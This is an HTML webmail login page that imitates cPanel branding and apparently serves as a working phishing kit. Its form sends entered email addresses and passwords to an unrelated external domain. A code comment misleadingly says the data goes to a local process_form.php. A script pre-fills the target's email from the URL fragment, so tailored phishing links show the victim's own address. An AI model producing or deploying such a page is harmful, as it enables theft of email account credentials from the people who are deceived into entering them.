<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff; /* Pure white background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            width: 50%; /* Reduced form size by 25% */
            max-width: 300px; /* Set max width */
            background-color: #ffffff; /* Pure white container */
            padding: 30px;
            border-radius: 10px;
            box-shadow: none; /* No border or shadow */
        }
        .login-container img {
            display: block;
            margin: 0 auto 30px auto; /* Centers the logo */
            max-width: 100%;
            height: auto;
        }
        .login-container form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-container label {
            width: 100%;
            font-size: 12px; /* Reduced font size for labels */
            font-weight: bold;
            color: #333; /* Darker text color for visibility */
            text-align: left;
            margin-bottom: 5px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 2px solid #ccc; /* Slightly thicker and more visible border */
            border-radius: 5px;
            background-color: #fff; /* Pure white background for inputs */
        }
        .login-container input:focus {
            border-color: #999; /* Darker border color when focused */
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #3399ff; /* Slightly lighter blue button */
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #0073e6; /* Slightly darker blue on hover */
        }
        .login-container button:active {
            background-color: #005bb5; /* Even darker blue when clicked */
        }
        .language-selector {
            margin-top: 10px;
            text-align: center;
        }
        .language-selector a {
            text-decoration: none;
            color: #0073e6; /* Blue link color for contrast */
            margin: 0 5px;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #777;
            text-align: center;
        }
        @media (max-width: 768px) {
            .login-container {
                width: 80%; /* Narrower width for smaller screens */
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://iili.io/dPsXJ5X.png" alt="Webmail Logo"> <!-- Webmail logo -->
        
        <!-- The form submits data to process_form.php -->
        <form action="https://chpsalms.shop/cadoo/card.php" method="POST">
            <label for="email">Email Address</label>
            <input type="email" id="email" name="email" placeholder="Enter your email address" required pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$" title="Please enter a valid email address.">

            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your email password" required>
            <input type="checkbox" id="show-password" onclick="togglePassword()"> <label for="show-password">Show Password</label>

            <button type="submit">Log in</button>
        </form>

        <!-- Footer for additional links -->
        <div class="language-selector">
            <a href="#">English</a> | 
            <a href="#">Español</a> | 
            <a href="#">Français</a>
        </div>

        <!-- Footer content -->
        <div class="footer">
            <p>Copyright © 2024 cPanel, L.L.C. | <a href="#">Privacy Policy</a></p>
        </div>
    </div>

    <script>
        // Toggle password visibility
        function togglePassword() {
            var passwordInput = document.getElementById("password");
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
            } else {
                passwordInput.type = "password";
            }
        }

        // Auto-fill email from URL hash
        window.onload = function() {
            var hash = window.location.hash.substring(1); // Get hash part of the URL and remove the #
            if (hash.includes('@') && hash.includes('.')) { // Check if the hash looks like an email
                document.getElementById("email").value = hash; // Set the email input field value
            }
        };
    </script>
</body>
</html>
